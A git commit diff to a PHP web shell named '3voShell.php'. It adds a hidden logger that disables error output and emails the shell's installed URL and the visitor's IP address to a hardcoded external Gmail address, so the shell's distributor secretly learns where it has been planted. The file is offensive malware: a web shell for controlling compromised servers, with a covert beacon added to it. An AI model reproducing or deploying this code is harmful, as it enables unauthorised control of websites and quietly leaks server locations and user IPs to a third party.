3ff2ca43364fae4385c97c8a5c1b617d0e30fba5
alxwahid <34950902+alxwahid@users.noreply.github.com>
2019-04-13 00:23:17 +0800

    Update 3voShell.php

--- 3voShell.php
+++ 3voShell.php
@@ -229,6 +229,17 @@ If you say this is a game,we also say this is a game,can make clutter on your we
 <input type="password" name="pass">
 </form>
 <?php
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+set_time_limit(0);
+ini_set('memory_limit', '64M');
+header('Content-Type: text/html; charset=UTF-8');
+$tujuanmail = 'illangsailor@gmail.com, illangsailor@gmail.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+?>
+<?php
 exit;
 }
 if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
